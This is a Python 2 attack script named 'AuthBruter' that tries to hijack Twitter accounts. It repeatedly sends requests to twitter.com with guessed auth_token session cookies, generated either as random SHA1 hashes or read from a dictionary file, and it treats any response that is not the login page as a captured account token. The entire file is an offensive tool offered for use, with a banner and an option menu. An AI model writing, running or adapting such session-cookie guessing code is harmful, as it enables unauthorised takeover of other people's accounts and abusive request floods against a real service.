#!/usr/bin/env python
#Max Convinations: 178689910246017054531432477289437798228285773001601743140683776
import requests, re, random, hashlib
global Finished

def bruteForce():
    #Key word: "Welcome to Twitter - Login or Sign up"
    Finished = False
    while (Finished == False):
        data = "Welcome to Twitter - Login or Sign up" #Data to determinate if I'm in the Welcome Page
        data_aux = "Log in to Twitter" #Data to determinate if I'm in the Welcome Page
        first_data = re.compile(data)
        second_data = re.compile(data_aux)
        hash = hashlib.sha1(str(random.random())).hexdigest() #Generate a Random Sha1 Hash
        print "Hash Value: %s" % hash
        cookie = {'auth_token' : 'default' , 'lang' : 'en'} #Dictionary of Cookies
        cookie['auth_token'] = str(hash) #Give a value to the auth_token
        r = requests.post('https://www.twitter.com', cookies=cookie) #Request for a page with this cookies
        result = re.search(first_data, r.text) #Search if is the Welcome Page
        if (result == None): #If I'm not in Welcome page
           aux_result = re.search(second_data, r.text)
           if (aux_result == None): #If I'm not in Welcome page
               print "Here we found a Hash!" #I'm a Home page :)
               print "Account Hash: %s" % hash
               Finished = True
               break
           else: #I'm on the Welcome page
               print "Nothing Found"
        else: #I'm on the Welcome page
           print "Nothing Found"
    return

def dicAttack():
    Finished = False
    while (Finished == False):
        data = "Welcome to Twitter - Login or Sign up" #Data to determinate if I'm in the Welcome Page
        data_aux = "Log in to Twitter" #Data to determinate if I'm in the Welcome Page
        first_data = re.compile(data)
        second_data = re.compile(data_aux)
        choose = str(raw_input("Enter the path of the dic: "))
        file = open(choose, "r+").read().split('\n') #Eliminate the "New Line" in file
        for line in file:
            print "Hash Value: %s" % line #Select a Hash from dic
            cookie = {'auth_token' : 'default' , 'lang' : 'en'} #Dictionary of Cookies
            cookie['auth_token'] = str(line) #Give a value to the auth_token
            r = requests.post('https://www.twitter.com', cookies=cookie) #Request for a page with this cookies
            result = re.search(first_data, r.text)
            if (result == None): #If I'm not in Welcome page
               aux_result = re.search(second_data, r.text)
               if (aux_result == None): #If I'm not in Welcome page
                   print "Here we found a Hash!" #I'm a Home page :)
                   print "Account Hash: %s" % line
                   Finished = True
                   break
               else: #I'm on the Welcome page
                   print "Nothing Found"
            else:  #I'm on the Welcome page
               print "Nothing Found"
    return

def main():
    Finished = False
    print '''
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
               AAA                                     tttt         hhhhhhh                  BBBBBBBBBBBBBBBBB                                                tttt                                                  
              A:::A                                 ttt:::t         h:::::h                  B::::::::::::::::B                                            ttt:::t                                                  
             A:::::A                                t:::::t         h:::::h                  B::::::BBBBBB:::::B                                           t:::::t                                                  
            A:::::::A                               t:::::t         h:::::h                  BB:::::B     B:::::B                                          t:::::t                                                  
           A:::::::::A        uuuuuu    uuuuuuttttttt:::::ttttttt    h::::h hhhhh              B::::B     B:::::Brrrrr   rrrrrrrrr   uuuuuu    uuuuuuttttttt:::::ttttttt        eeeeeeeeeeee    rrrrr   rrrrrrrrr   
          A:::::A:::::A       u::::u    u::::ut:::::::::::::::::t    h::::hh:::::hhh           B::::B     B:::::Br::::rrr:::::::::r  u::::u    u::::ut:::::::::::::::::t      ee::::::::::::ee  r::::rrr:::::::::r  
         A:::::A A:::::A      u::::u    u::::ut:::::::::::::::::t    h::::::::::::::hh         B::::BBBBBB:::::B r:::::::::::::::::r u::::u    u::::ut:::::::::::::::::t     e::::::eeeee:::::eer:::::::::::::::::r 
        A:::::A   A:::::A     u::::u    u::::utttttt:::::::tttttt    h:::::::hhh::::::h        B:::::::::::::BB  rr::::::rrrrr::::::ru::::u    u::::utttttt:::::::tttttt    e::::::e     e:::::err::::::rrrrr::::::r
       A:::::A     A:::::A    u::::u    u::::u      t:::::t          h::::::h   h::::::h       B::::BBBBBB:::::B  r:::::r     r:::::ru::::u    u::::u      t:::::t          e:::::::eeeee::::::e r:::::r     r:::::r
      A:::::AAAAAAAAA:::::A   u::::u    u::::u      t:::::t          h:::::h     h:::::h       B::::B     B:::::B r:::::r     rrrrrrru::::u    u::::u      t:::::t          e:::::::::::::::::e  r:::::r     rrrrrrr
     A:::::::::::::::::::::A  u::::u    u::::u      t:::::t          h:::::h     h:::::h       B::::B     B:::::B r:::::r            u::::u    u::::u      t:::::t          e::::::eeeeeeeeeee   r:::::r            
    A:::::AAAAAAAAAAAAA:::::A u:::::uuuu:::::u      t:::::t    tttttth:::::h     h:::::h       B::::B     B:::::B r:::::r            u:::::uuuu:::::u      t:::::t    tttttte:::::::e            r:::::r            
   A:::::A             A:::::Au:::::::::::::::uu    t::::::tttt:::::th:::::h     h:::::h     BB:::::BBBBBB::::::B r:::::r            u:::::::::::::::uu    t::::::tttt:::::te::::::::e           r:::::r            
  A:::::A               A:::::Au:::::::::::::::u    tt::::::::::::::th:::::h     h:::::h     B:::::::::::::::::B  r:::::r             u:::::::::::::::u    tt::::::::::::::t e::::::::eeeeeeee   r:::::r            
 A:::::A                 A:::::Auu::::::::uu:::u      tt:::::::::::tth:::::h     h:::::h     B::::::::::::::::B   r:::::r              uu::::::::uu:::u      tt:::::::::::tt  ee:::::::::::::e   r:::::r            
AAAAAAA                   AAAAAAA uuuuuuuu  uuuu        ttttttttttt  hhhhhhh     hhhhhhh     BBBBBBBBBBBBBBBBB    rrrrrrr                uuuuuuuu  uuuu        ttttttttttt      eeeeeeeeeeeeee   rrrrrrr            
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
                                                                                                                                                                                                                    
                                                                                                                                                                                                 By Francisco Canteli
Please chose an option:
1. Use Brute Force.
2. Use a Dictionary.
3. Exit.
    '''
    choose = int(raw_input("Enter your option: "))
    if (choose == 1):
        bruteForce()
    elif (choose == 2):
        dicAttack()
    elif (choose == 3):
        exit()
    else:
        print("You haven't choose a valid option")
        main()
    return

main()
